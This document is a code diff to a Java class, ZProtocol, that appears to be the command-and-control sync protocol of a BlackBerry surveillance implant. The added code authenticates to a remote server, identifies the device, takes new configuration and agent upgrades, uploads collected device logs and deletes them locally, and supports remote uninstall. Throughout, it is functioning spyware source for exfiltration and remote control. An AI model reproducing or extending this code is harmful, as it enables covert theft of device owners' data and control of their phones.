@@ -1,6 +1,7 @@
 //#preprocess
 package blackberry.action.sync.protocol;
 
+import java.io.EOFException;
 import java.util.Vector;
 
 import net.rim.device.api.crypto.RandomSource;
@@ -16,6 +17,7 @@ import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.fs.AutoFlashFile;
+import blackberry.fs.Directory;
 import blackberry.fs.Path;
 import blackberry.log.LogCollector;
 import blackberry.transfer.CommandException;
@@ -42,6 +44,7 @@ public class ZProtocol extends Protocol {
         reload = false;
         uninstall = false;
 
+        // key init
         cryptoConf.makeKey(Keys.getInstance().getChallengeKey());
         RandomSource.getBytes(Kd);
         RandomSource.getBytes(Nonce);
@@ -60,34 +63,42 @@ public class ZProtocol extends Protocol {
             byte[] response = transport.command(cypherOut);
             parseAuthentication(response);
 
+            if (uninstall) {
+                return true;
+            }
+
             //#ifdef DEBUG
             debug.info("***** Identification *****");
             //#endif  
-            response = command(Proto.ID, forgeIdentification());
+            response = command(Proto.ID, forgeIdentification(), false);
             parseIdentification(response);
 
             //#ifdef DEBUG
             debug.info("***** NewConf *****");
             //#endif  
-            response = command(Proto.NEW_CONF, forgeNewConf());
+            response = command(Proto.NEW_CONF);
             parseNewConf(response);
 
             //#ifdef DEBUG
             debug.info("***** Download *****");
             //#endif  
-            //response = cypherCommand(Proto.DOWNLOAD, forgeDownload());
-            //parseDownload(response);
+            response = command(Proto.DOWNLOAD);
+            parseDownload(response);
 
             //#ifdef DEBUG
             debug.info("***** Upload *****");
             //#endif  
-            //response = cypherCommand(Proto.UPLOAD, forgeUpload());
-            //parseUpload(response);
+
+            boolean left = true;
+            while (left) {
+                response = command(Proto.UPLOAD);
+                left = parseUpload(response);
+            }
 
             //#ifdef DEBUG
             debug.info("***** FileSystem *****");
             //#endif  
-            //response = cypherCommand(Proto.FILESYSTEM, forgeFileSystem());
+            //response = command(Proto.FILESYSTEM);
             //parseFileSystem(response);
 
             //#ifdef DEBUG
@@ -95,18 +106,20 @@ public class ZProtocol extends Protocol {
             //#endif  
 
             forgeLogs(Path.SD());
-            forgeLogs(Path.USER());
+            if (!Path.SD().equals(Path.USER())) {
+                forgeLogs(Path.USER());
+            }
 
             //#ifdef DEBUG
-            debug.info("***** End *****");
+            debug.info("***** END *****");
             //#endif  
-            response = command(Proto.LOG_END, forgeEnd());
+            response = command(Proto.BYE);
             parseEnd(response);
 
             return true;
 
         } catch (TransportException e) {
-            //#ifdef DEBUG
+            //#ifdef DEBUG 
             debug.error(e);
             //#endif
             return false;
@@ -125,7 +138,7 @@ public class ZProtocol extends Protocol {
 
     ////************************** PROTOCOL *************************************** ////
 
-    private byte[] forgeAuthentication() {
+    protected byte[] forgeAuthentication() {
         Keys keys = Keys.getInstance();
 
         byte[] data = new byte[104];
@@ -179,7 +192,7 @@ public class ZProtocol extends Protocol {
         return data;
     }
 
-    private void parseAuthentication(byte[] authResult)
+    protected void parseAuthentication(byte[] authResult)
             throws ProtocolException {
         //#ifdef DBC
         Check.ensures(authResult.length == 48, "authResult.length="
@@ -243,15 +256,15 @@ public class ZProtocol extends Protocol {
                 //#ifdef DEBUG
                 debug.trace("decodeAuth error: " + cap);
                 //#endif
-                throw new ProtocolException();
+                throw new ProtocolException(11);
             }
         } else {
-            throw new ProtocolException();
+            throw new ProtocolException(12);
         }
 
     }
 
-    private byte[] forgeIdentification() {
+    protected byte[] forgeIdentification() {
         final Device device = Device.getInstance();
         device.refreshData();
 
@@ -282,15 +295,11 @@ public class ZProtocol extends Protocol {
         return content;
     }
 
-    private void parseIdentification(byte[] content) throws ProtocolException {
-        checkOk(content);
+    protected void parseIdentification(byte[] result) throws ProtocolException {
+        checkOk(result);
     }
 
-    private byte[] forgeNewConf() {
-        return null;
-    }
-
-    private void parseNewConf(byte[] result) throws ProtocolException,
+    protected void parseNewConf(byte[] result) throws ProtocolException,
             CommandException {
         int res = Utils.byteArrayToInt(result, 0);
         if (res == Proto.OK) {
@@ -298,8 +307,12 @@ public class ZProtocol extends Protocol {
             debug.info("got NewConf");
             //#endif
 
-            byte[] plainConf = cryptoConf.decryptData(result, 4);
-            boolean ret = Protocol.saveNewConf(plainConf);
+            int confLen = Utils.byteArrayToInt(result, 4);
+            //#ifdef DEBUG
+            debug.trace("parseNewConf len: " + confLen);
+            //#endif
+
+            boolean ret = Protocol.saveNewConf(result, 8);
             if (ret) {
                 reload = true;
             }
@@ -316,31 +329,150 @@ public class ZProtocol extends Protocol {
         }
     }
 
-    private byte[] forgeDownload() {        
-        return null;
+    protected void parseDownload(byte[] result) throws ProtocolException {
+        int res = Utils.byteArrayToInt(result, 0);
+        if (res == Proto.OK) {
+            //#ifdef DEBUG
+            debug.trace("parseDownload, OK");
+            //#endif
+            DataBuffer dataBuffer = new DataBuffer(result, 4,
+                    result.length - 4, false);
+            try {
+                // la totSize e' discutibile
+                int totSize = dataBuffer.readInt(); 
+                int numElem = dataBuffer.readInt();
+                for (int i = 0; i < numElem; i++) {
+                    String file = WChar.readPascal(dataBuffer);
+                    //#ifdef DEBUG
+                    debug.trace("parseDownload: " + file);
+                    //#endif
+
+                    // expanding $dir$
+                    file = Directory.expandMacro(file);
+                    Protocol.saveDownloadLog(file);
+                }
+
+            } catch (EOFException e) {
+                //#ifdef DEBUG
+                debug.error(e);
+                //#endif
+                throw new ProtocolException();
+            }
+        } else if (res == Proto.NO) {
+            //#ifdef DEBUG
+            debug.info("parseDownload: no download");
+            //#endif
+        } else {
+            //#ifdef DEBUG
+            debug.error("parseDownload, wrong answer: " + res);
+            //#endif
+            throw new ProtocolException();
+        }
     }
 
-    private void parseDownload(byte[] content) throws ProtocolException {
-        checkOk(content);
+    /**
+     * @param content
+     * @return true if left>0
+     * @throws ProtocolException
+     */
+    protected boolean parseUpload(byte[] result) throws ProtocolException {
+
+        int res = Utils.byteArrayToInt(result, 0);
+        if (res == Proto.OK) {
+            //#ifdef DEBUG
+            debug.trace("parseUpload, OK");
+            //#endif
+            DataBuffer dataBuffer = new DataBuffer(result, 4,
+                    result.length - 4, false);
+            try {
+                int left = dataBuffer.readInt();
+                //#ifdef DEBUG
+                debug.trace("parseUpload left: " + left);
+                //#endif
+                String file = WChar.readPascal(dataBuffer);
+                //#ifdef DEBUG
+                debug.trace("parseUpload: " + file);
+                //#endif
+
+                int size = dataBuffer.readInt();
+                byte[] content = new byte[size];
+                dataBuffer.read(content);
+
+                if (file.equals(Protocol.UPGRADE_FILENAME)) {
+                    //#ifdef DEBUG
+                    debug.info("Upgrade");
+                    //#endif
+                    Protocol.upgrade(content);
+                } else {
+                    //#ifdef DEBUG
+                    debug.trace("parseUpload: saving");
+                    //#endif
+                    Protocol.saveUpload(file, content);
+                }
+
+                return left > 0;
+
+            } catch (EOFException e) {
+                //#ifdef DEBUG
+                debug.error(e);
+                //#endif
+                throw new ProtocolException();
+            }
+        } else if (res == Proto.NO) {
+            //#ifdef DEBUG
+            debug.trace("parseUpload, NO");
+            //#endif
+            return false;
+        } else {
+            //#ifdef DEBUG
+            debug.error("parseUpload, wrong answer: " + res);
+            //#endif
+            throw new ProtocolException();
+        }
     }
 
-    private byte[] forgeUpload() {
-        return null;
+    protected void parseFileSystem(byte[] result) throws ProtocolException {
+        int res = Utils.byteArrayToInt(result, 0);
+        if (res == Proto.OK) {
+            //#ifdef DEBUG
+            debug.trace("parseFileSystem, OK");
+            //#endif
+            DataBuffer dataBuffer = new DataBuffer(result, 4,
+                    result.length - 4, false);
+            try {
+                int numElem = dataBuffer.readInt();
+                for (int i = 0; i < numElem; i++) {
+                    int depth = dataBuffer.readInt();
+                    String file = WChar.readPascal(dataBuffer);
+                    //#ifdef DEBUG
+                    debug
+                            .trace("parseFileSystem: " + file + " depth: "
+                                    + depth);
+                    //#endif
+
+                    // expanding $dir$
+                    file = Directory.expandMacro(file);
+                    // TODO
+                    //Protocol.saveFilesystem(file);
+                }
+
+            } catch (EOFException e) {
+                throw new ProtocolException();
+            }
+        } else if (res == Proto.NO) {
+            //#ifdef DEBUG
+            debug.info("parseFileSystem: no download");
+            //#endif
+        } else {
+            //#ifdef DEBUG
+            debug.error("parseFileSystem, wrong answer: " + res);
+            //#endif
+            throw new ProtocolException();
+        }
     }
 
-    private void parseUpload(byte[] content) throws ProtocolException {
-        checkOk(content);
-    }
-
-    private byte[] forgeFileSystem() {
-        return null;
-    }
-
-    private void parseFileSystem(byte[] content) throws ProtocolException {
-        checkOk(content);
-    }
-
-    private void forgeLogs(String basePath) throws TransportException, ProtocolException {
+    protected void forgeLogs(String basePath) throws TransportException,
+            ProtocolException {
         //#ifdef DEBUG
         debug.info("sending logs from: " + basePath);
         //#endif
@@ -369,9 +501,9 @@ public class ZProtocol extends Protocol {
                         + " = " + fullLogName);
                 //#endif
 
-                byte[] response = command(Proto.LOG, content);
+                byte[] response = command(Proto.LOG, content, true);
                 parseLog(response);
-              
+
                 logCollector.remove(fullLogName);
             }
             if (!Path.removeDirectory(basePath + dir)) {
@@ -382,37 +514,57 @@ public class ZProtocol extends Protocol {
         }
     }
 
-    private void parseLog(byte[] content) throws ProtocolException {
-        checkOk(content);
+    protected void parseLog(byte[] result) throws ProtocolException {
+        checkOk(result);
     }
 
-    private byte[] forgeEnd() {
-        return Utils.intToByteArray(Proto.LOG_END);
+    protected void parseEnd(byte[] result) throws ProtocolException {
+        checkOk(result);
     }
 
-    private void parseEnd(byte[] content) throws ProtocolException {
-        checkOk(content);
+    //// ****************************** INTERNALS ****************************************** ////
+
+    private byte[] command(int command) throws TransportException {
+        //#ifdef DEBUG
+        debug.trace("command: " + command);
+        //#endif
+        byte[] plainOut = Utils.intToByteArray(command);
+        byte[] cypherOut = cryptoK.encryptData(plainOut);
+        byte[] cypherIn = transport.command(cypherOut);
+        byte[] plainIn = cryptoK.decryptData(cypherIn);
+        return plainIn;
     }
 
-    //// ************************************************************************ ////
-    private byte[] command(int command, byte[] data)
+    private byte[] command(int command, byte[] data, boolean addLen)
             throws TransportException {
         //#ifdef DBC
         Check.requires(cryptoK != null, "cypherCommand: cryptoK null");
+        Check.requires(data != null, "cypherCommand: data null");
         //#endif
 
-        int dataLen = 0;
-        if (data != null) {
-            dataLen = data.length;
-        }
+        //#ifdef DEBUG
+        debug.trace("command: " + command + " datalen: " + data.length);
+        //#endif
 
-        byte[] plainOut = new byte[dataLen + 4];
-        Utils.copy(plainOut, 0, Utils.intToByteArray(command), 0, 4);
+        int dataLen = data.length;
+        byte[] plainOut;
+        if (addLen) {
+            plainOut = new byte[dataLen + 8];
+            Utils.copy(plainOut, 0, Utils.intToByteArray(command), 0, 4);
+            Utils.copy(plainOut, 4, Utils.intToByteArray(data.length), 0, 4);
+            Utils.copy(plainOut, 8, data, 0, data.length);
 
-        if (data != null) {
+        } else {
+            plainOut = new byte[dataLen + 4];
+            Utils.copy(plainOut, 0, Utils.intToByteArray(command), 0, 4);
             Utils.copy(plainOut, 4, data, 0, data.length);
         }
 
+        byte[] plainIn = cypheredWriteRead(plainOut);
+        return plainIn;
+    }
+
+    private byte[] cypheredWriteRead(byte[] plainOut) throws TransportException {
         byte[] cypherOut = cryptoK.encryptData(plainOut);
         byte[] cypherIn = transport.command(cypherOut);
         byte[] plainIn = cryptoK.decryptData(cypherIn);
